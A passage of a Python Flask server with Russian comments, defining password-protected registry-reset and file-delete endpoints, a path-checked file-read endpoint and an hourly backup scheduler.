        # Защита: требуется заголовок X-Delete-Hash, совпадающий с SECRET_DELETE
        provided_hash = request.headers.get('X-Delete-Hash', '')
        correct_password = os.environ.get('SECRET_DELETE')

        if not correct_password:
            logger.error("SECRET_DELETE not configured")
            return jsonify({'status': 'error', 'message': 'SECRET_DELETE not configured'}), 500

        if not verify_password_hash(provided_hash, correct_password):
            client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
            logger.warning(f"Unauthorized reset-registry attempt from {client_ip}")
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401

        # Стираем реестр (hashes, недавние тексты и технические fingerprint)
        reg = load_registry()
        reg['sent_hashes'] = {}
        reg['sent_contents'] = []
        reg['technical_fingerprints'] = {}
        save_registry(reg)
        logger.info("Registry has been reset: sent_hashes, sent_contents and technical_fingerprints cleared")
        return jsonify({'status': 'ok', 'message': 'Registry cleared'}), 200
    except Exception as e:
        logger.error(f"Reset registry error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/read', methods=['GET'])
@rate_limit(max_attempts=50, window_seconds=300)
def read_file():
    try:
        # Блокировка автоматических инструментов
        block_result = block_automated_tools()
        if block_result:
            return block_result
        path = request.args.get('path')
        if not path:
            return jsonify({'error': 'path required'}), 400
        if '..' in path or path.startswith('/'):
            return jsonify({'error': 'invalid path'}), 400
        base_dir = os.path.abspath(DATA_DIR)
        full_path = os.path.abspath(os.path.join(base_dir, path))
        if not full_path.startswith(base_dir + os.sep):
            return jsonify({'error': 'invalid path'}), 400
        if not os.path.exists(full_path):
            return jsonify({'error': 'invalid path'}), 400
        
        # Читаем с ограничением размера (защита от DoS)
        with open(full_path, 'r', encoding='utf-8') as f:
            content = f.read(500000)  # Макс 500KB
            if len(f.read(1)) > 0:
                content += '\n[File truncated]'
        
        logger.info(f"File read: {path}")
        return jsonify({'content': content}), 200
    except Exception as e:
        logger.error(f"Read error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/delete', methods=['DELETE'])
@rate_limit(max_attempts=5, window_seconds=60)
def delete_file():
    try:
        client_ip = request.headers.get('X-Forwarded-For') or request.remote_addr
        provided_hash = request.headers.get('X-Delete-Hash', '')
        correct_password = os.environ.get('SECRET_DELETE')
        
        if not correct_password:
            logger.error("SECRET_DELETE not configured")
            return jsonify({'error': 'SECRET_DELETE not configured'}), 500
        
        if not verify_password_hash(provided_hash, correct_password):
            logger.warning(f"Failed delete authorization from {client_ip}")
            return jsonify({'error': 'Unauthorized'}), 401
        
        logger.info(f"Successful file delete from {client_ip}")
        
        path = request.args.get('path')
        if not path:
            return jsonify({'error': 'path required'}), 400
        if '..' in path or path.startswith('/'):
            return jsonify({'error': 'invalid path'}), 400
        base_dir = os.path.abspath(DATA_DIR)
        full_path = os.path.abspath(os.path.join(base_dir, path))
        if not full_path.startswith(base_dir + os.sep):
            return jsonify({'error': 'invalid path'}), 400
        if not os.path.exists(full_path):
            return jsonify({'error': 'invalid path'}), 400
        os.remove(full_path)
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

INTEGRITY_CHECK = "backend_security_v2_2025"

def create_backup():
    """Создание резервной копии данных"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_dir = os.path.join('backups', timestamp)
        os.makedirs(backup_dir, exist_ok=True)
        
        if os.path.exists(DATA_DIR):
            shutil.copytree(DATA_DIR, os.path.join(backup_dir, 'data'))
            logger.info(f"Backup created: {backup_dir}")
            
            # Удаляем старые backup (старше 7 дней)
            if os.path.exists('backups'):
                for item in os.listdir('backups'):
                    item_path = os.path.join('backups', item)
                    if os.path.isdir(item_path):
                        age = time.time() - os.path.getctime(item_path)
                        if age > 7 * 24 * 3600:  # 7 дней
                            shutil.rmtree(item_path)
                            logger.info(f"Deleted old backup: {item}")
    except Exception as e:
        logger.error(f"Backup error: {e}")

def backup_scheduler():
    """Планировщик для автоматических backup"""
    while True:
        time.sleep(3600)
        create_backup()

backup_thread = threading.Thread(target=backup_scheduler, daemon=True)
backup_thread.start()
logger.info("Backup scheduler started")

if __name__ == '__main__':
    logger.info("Starting Flask server with enhanced security")
    app.run(host='0.0.0.0', port=5000)

